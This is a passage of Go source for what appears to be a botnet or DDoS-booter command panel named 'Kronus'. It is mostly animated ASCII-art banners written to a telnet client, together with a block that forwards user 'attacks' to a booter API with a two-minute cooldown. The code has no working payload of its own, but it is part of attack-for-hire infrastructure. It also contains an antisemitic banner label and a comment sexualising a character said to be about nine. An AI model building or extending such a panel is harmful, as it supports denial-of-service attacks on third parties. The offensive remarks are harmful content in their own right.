            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[34m           / == /       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |  |        \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[33m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[33m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[33m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[33m|                         |        \r\n"))
            this.conn.Write([]byte("\033[33m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[93m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[37m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[37m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[37m          | ;  :|    K R O N U S   \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
 		    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                 
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                               
            this.conn.Write([]byte("\033[97m\r\n"))
            this.conn.Write([]byte("\033[37m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                
            this.conn.Write([]byte("\033[93m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝         \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║           \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[33m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝         \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
			time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header	
			this.conn.Write([]byte("\033[1;49;32m	                         ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                  \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╔══════════════════════════════════════════╗    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mYour Attack Was Sent To Kronus API       \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mPlease Wait 2 Minutes For Next Attack    \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32m            Kronus                       \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╚══════════════════════════════════════════╝    \033[0m \r\n"))	
			this.conn.Write([]byte("\033[1;49;35m                                                           \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                    ███████╗███████╗███╗   ██╗████████╗    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████╗█████╗  ██╔██╗ ██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚════██║██╔══╝  ██║╚██╗██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████║███████╗██║ ╚████║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m\r\n"))	
				continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║Error... IP Address Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35m                              ║API Server Result\033[1;49;32m: \r\n\033[93m" + locformatted + "\x1b[0m\r\n"))
        }
        ///////////////////////// END OF API BOOTER
        ///////////////////////// anti crash
        if strings.Contains(cmd, "@") {
            continue
        }
        ///////////////////////// END OF API BOOTER
		if userInfo.admin == 0 && cmd == "admin" {
            this.conn.Write([]byte("\033[31m ║ \033[31mThis Command is Only for ADMINS!  \033[31m║ \r\n"))
            continue

        }//BANNERS
           /*--------------------------------------------------------------------------------------------------------------------------------------------*/         
			if err != nil || cmd == "banner" || cmd == "BAN" || cmd == "banners" || cmd == "BANNERS" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
			this.conn.Write([]byte("\033[31m                   ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m               ╔═════════════════\033[1;49;32m════════════════════╗\033[0m \r\n")) //Sum Cool banner for cool kids LMFAO
            this.conn.Write([]byte("\033[31m               ║ ⮞GOOGLE - google b\033[1;49;32manner1            ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m               ║ ⮞MESSIAH - messiah ba\033[1;49;32mnner           ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m               ║ ⮞VOLTAGE -  voltage ba\033[1;49;32mnner          ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m               ║ ⮞APOLLO -  apollo ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m               ║ ⮞DOOM -  doom ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m               ║ ⮞HYBRID -  hybrid ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m               ║ ⮞XANAX -  xanax ba\033[1;49;32mnner              ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m               ║ ⮞ICED -  iced ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m               ║ ⮞JEWS -  jews ba\033[1;49;32mnner                ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m               ╚═════════════════\033[1;49;32m════════════════════╝\033[0m \r\n"))
			
			continue
        }//BANNERS
if err != nil || cmd == "nezuko" || cmd == "NEZUKO" {
this.conn.Write([]byte("\033[2J\033[1H")) //header
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠍⢁⠄⠻⠟⠄⠄⠄⠄⠄⠄⠄⠙⠿⠿⠋⠄⠄⠄⠄⠄⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n")) //Hugelock Dies for this bitch although shes like 9 smh
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠶⣶⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣽⣿⠟⠄⠄⠄⠄⣀⣤⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡀⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢻⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⣔⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣀⣤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠹⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⠏⠏⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⠻⣿⣿⣿⣿⣷⠄⠄⠻⣿⣧⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣶⣶⣷⢹⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣳⠄⠄⣈⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⢝⣿⣿⣿⡆⠄⠄⠈⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⢘⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣳⠇⠄⠠⠖⠉⠌⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡽⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣄⠄⠄⠄⠄⠄⢸⠘⣾\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣷⣿⠄⠄⢠⣿⣀⣄⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣽⣿⡀⠄⠄⠄⠄⠄⠄⡠⣺⣿⣿⣿⠗⠄⠄⠄⠄⢸⡇⢹\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡿⣿⠄⢠⢘⣷⣿⣻⣿⣿⣿⣿⣿⣿⡿⠿⠑⠬⠈⢙⣽⣿⣿⣿⣿⣿⣧⠄⠄⠄⢀⠦⠄⣚⠉⠉⠁⠄⠄⠄⠄⠄⠄⢸⡇⢸\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⠿⡅⣹⡇⢠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠁⢘⢟⣿⣿⣿⡟⠄⠄⠄⠈⠉⠁⢻⣦⠄⠄⠄⠄⠄⠄⠄⠄⣸⡇⣸\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⢏⣾⡇⣿⠄⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⣷⣔⢀⣀⡀⠸⣿⣿⠟⠄⠄⠄⠄⠄⠄⠄⠄⠿⣷⡀⠄⠄⠄⢀⣠⣦⣿⡟⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣏⣿⣿⡇⣿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣿⡟⠸⡿⠅⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠂⠄⠄⠙⠛⠛⣿⣹⡇\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⢹⣿⣿⡇⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⣭⣭⣵⡶⣣⡞⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣇⣽⠃\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣼⣿⣿⣿⡀⠸⣿⣿⣿⣟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣾⠏⠄⠄⠄⠄⠄⠰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣸⣿⠏⢰\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⠄⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣡⣿⠏⠄⠄⠄⠄⠄⠄⡾⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿⣰⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡃⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⠏⠄⠄⠄⠄⠄⠄⠄⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡄⢹⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⡇⠄⠈⠙⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⠁⠘⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣟⣿⢀⡇⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠂⠄⠉⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⣧⠄⢻⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⢯⣿⣿⢸⡇⠄⡄⠄⠄⠄⠄⠄⠄⠄⢳⡄⣀⣤⣶⣾⣿⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣆⢿⣷⠄⢻\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⢸⡇⢸⠁⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⡇⠆⠄⠄⠄⠄⠄⠄⢠⣴⣶⠟⠄⠄⢀⣤⣤⣤⠄⠄⠄⠄⠸⢿⡘⣿⣷⡀\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣷⣿⣿⢸⡇⣸⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⡿⣣⡐⠄⠄⠄⠄⠄⠄⠙⠛⠁⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠈⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡌⡇⡇⠄⢀⠄⠄⠄⠄⠄⢀⣶⡷⢻⣿⡿⣟⣵⣿⣿⣧⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢣⠈⠻⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⠄⠁⢰⣿⠁⠄⠄⠄⠄⣿⣿⢹⢸⢿⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢢⣾⠄⠑\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                     NEZUKO CUTE AF  \r\n"))				  
	     continue
        }			  
				  if cmd == "GOOGLE" || cmd == "google" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[32m                               ,,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   .g8'''bgd                               \x1b[32m`7MM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m .dP'     `M                                 \x1b[32mMM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m dM'       `   \x1b[31m,pW'Wq.   \x1b[33m,pW'Wq.   \x1b[34m.P'Ybmmm  \x1b[32mMM  \x1b[31m.gP'Ya      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM           \x1b[31m6W'   `Wb \x1b[33m6W'   `Wb \x1b[34m:MI  I8    \x1b[32mMM \x1b[31m,M'   Yb      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM.    `7MMF'\x1b[31m8M     M8 \x1b[33m8M     M8  \x1b[34mWmmmP'    \x1b[32mMM \x1b[31m8M''''''      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m `Mb.     MM  \x1b[31mYA.   ,A9 \x1b[33mYA.   ,A9 \x1b[34m8M         \x1b[32mMM \x1b[31mYM.    ,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   `'bmmmdPY   \x1b[31m`Ybmd9'   \x1b[33m`Ybmd9'   \x1b[34mYMMMMMb \x1b[32m.JMML.\x1b[31m`Mbmmd'      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                         6'     dP      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                          Ybmmmd'      \r\n"))
            continue
        }
        if cmd == "MESSIAH" || cmd == "messiah" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[33m      `.▄▄ · ▄▄▌▄▄▄█..▄▄█·`.▄▄█·`·▀`·▄▄▄▌·`▄ .▄▌·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m       `██▌`▐██·█▄.▀·▐█ ▀.·▐█ ▀.·██·▐█·▀█ ██·▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m      '·█▌█ █▐█·█▀▀·▄▄▀▀▀█▄▄▀▀▀█▄▐█·▄█▀▀█·██▀▐█ `     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·`▐█▌▐█▌▐█▌██▄▄▌▐█▄·▐█▐█▄·▐█▐█▌▐█`·█▌██▌▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·▐▀▀· ▀` ▀▀.▀▀▀·`▀▀▀▀▌·▀▀▀▀`▀▀▀▐▀`·▀·▀▀▀▐▀▀·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╔═══════════════════════════════════════════════╗   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - - - - -\x1b[1;36mHakai \x1b[1;33mx \x1b[1;36mBlade\x1b[0m- - - - - - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - \x1b[1;33mType \x1b[1;36mHELP \x1b[1;33mfor \x1b[1;36mCommands List \x1b[0m- - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╚═══════════════════════════════════════════════╝   \x1b[0m    \r\n"))
            continue
        }

        if cmd == "VOLTAGE" || cmd == "voltage" {
        	this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\x1b[33m                                                                                 \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m          ,/     \r\n"))    
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m╗   \x1b[33m██\x1b[0m╗ \x1b[33m██████\x1b[0m╗ \x1b[33m██\x1b[0m╗  \x1b[33m████████\x1b[0m╗ \x1b[33m█████\x1b[0m╗  \x1b[33m██████\x1b[0m╗ \x1b[33m███████\x1b[0m╗ \x1b[33m        ,'/      \r\n")) 
	    this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m╔═══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m║  ╚══\x1b[33m██\x1b[0m╔══╝\x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m╔════╝ \x1b[33m██\x1b[0m╔════╝ \x1b[33m      ,' /       \r\n")) 
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m███████\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m███\x1b[0m╗\x1b[33m█████\x1b[0m╗   \x1b[33m    ,'  /_____,  \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m╚\x1b[33m██\x1b[0m╗ \x1b[33m██\x1b[0m╔╝\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m ██\x1b[0m║\x1b[33m██\x1b[0m╔══╝   \x1b[33m  .'____    ,'   \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m ╚\x1b[33m████\x1b[0m╔╝ ╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║  \x1b[33m██\x1b[0m║╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗ \x1b[33m       /  ,'     \r\n")) 
		this.conn.Write([]byte("\x1b[0m        ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ \x1b[33m      / ,'       \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m     /,'         \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m    /'           \r\n"))
            continue
        }
		if err != nil || cmd == "APOLLO" || cmd == "apollo" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\t   \x1b[0;34m .d8b. \x1b[0;37m d8888b.\x1b[0;34m  .d88b. \x1b[0;37m db     \x1b[0;34m db      \x1b[0;37m  .d88b.  \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34md8' `8b\x1b[0;37m 88  `8D\x1b[0;34m .8P  Y8.\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m .8P  Y8. \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88ooo88\x1b[0;37m 88oodD'\x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
